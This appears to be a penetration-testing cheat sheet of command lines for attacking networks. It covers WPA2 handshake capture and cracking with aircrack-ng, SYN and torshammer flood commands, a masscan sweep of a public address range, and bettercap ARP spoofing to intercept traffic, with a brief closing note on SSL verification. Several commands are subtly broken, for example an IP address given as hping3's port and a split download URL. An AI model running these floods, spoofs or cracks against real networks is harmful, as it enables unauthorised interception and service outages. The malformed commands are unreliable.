Handshake
A wireless handshake, specifically the four-way handshake, is a process that establishes a secure connection between a wireless access point (AP) and a client device on a network.

WPA2-PSK Cracking
The most common method for cracking WPA2-PSK is through an offline brute-force attack, which involves attempting multiple password combinations until the correct one is found. The prerequisite for such an attack is capturing a valid handshake from an active client on the network.

Tools Used (Aircrack-ng Suite):
airodump-ng: Analyzes networks and captures handshakes.

aireplay-ng: Performs deauthentication attacks.

aircrack-ng: Cracks the password using the captured handshake.

Capturing Packets for a Target Network:
sudo airodump-ng --bssid <target_BSSID> --channel <target_channel> --write <output_file> wlan0mon
Cracking the Password:
aircrack-ng -w <wordlist_file> <handshake_file>
Denial-of-Service (DoS) & Distributed Denial-of-Service (DDoS) Attacks
Common Tools:
HOIC (High Orbit Ion Cannon): Open-source stress testing tool for websites and networks.
Download Here

LOIC (Low Orbit Ion Cannon): Open-source network stress testing tool used for DoS attacks.
Download Here

hping3: Versatile tool for network testing, security auditing, and packet crafting. It can be used to test a network's resilience against DoS attacks.

Example hping3 Command:
sudo hping3 -S --flood -V -p <IP_ADDRESS>
torshammer.py: Python script for performing DDoS attacks.
GitHub Repository

Example torshammer Command:
python torshammer.py -t 192.168.1.100 -r 100000 -T
Network Reconnaissance
Nmap
Nmap Cheat Sheet

nmap -p 80 --script http-generator.nse
nmap -p 443 --script=http-headers,http-title,http-generator
nmap --script="default and http-*"
Masscan
Masscan Cheat Sheet

masscan -p80,443,8080,8443,81,4444,4443,8888 70.176.0.0/16
Netdiscover
Netdiscover Cheat Sheet

sudo netdiscover
Bettercap
Bettercap Cheat Sheet

sudo bettercap
Nessus - Vulnerability Scanner
Nessus is a widely used commercial vulnerability scanner designed to identify security threats, missing patches, misconfigurations, and vulnerable software.

Installation & Setup:
wget 'https://www.tenable.com/downloads/api/v1/public/pages/nessus/ downloads/18394/download?i_agree_to_tenable_license_agreeme nt=true' -O Nessus_amd64.deb
sudo apt install -f ./Nessus_amd64.deb
sudo systemctl enable nessusd
sudo systemctl start nessusd
systemctl status nessusd
Note:

Once installed, navigate to the Nessus web UI.

If you cannot create a new scan immediately, the plugins may still be initializing.

ARP Spoofing & MITM Attacks
Tools:
Ettercap: Official Website

MITM Framework: GitHub Repository

Driftnet: Kali Linux Tool

Performing MITM Attacks with Bettercap:
sudo apt-get install bettercap
sudo bettercap --iface <interface>
Running an ARP Spoofing Attack:
net.probe on
set arp.spoof.duplex true
set arp.spoof.targets 192.168.74.128
arp.spoof on
net.sniff on
SSL Verification & MITM Prevention
To prevent MITM attacks through SSL verification:

Ensure that the SSL certificate is issued by a trusted Certificate Authority (CA) and has not been revoked.

Verify that the domain name in the certificate matches the website's domain.

Use tools like OpenSSL to manually check certificate details when necessary.

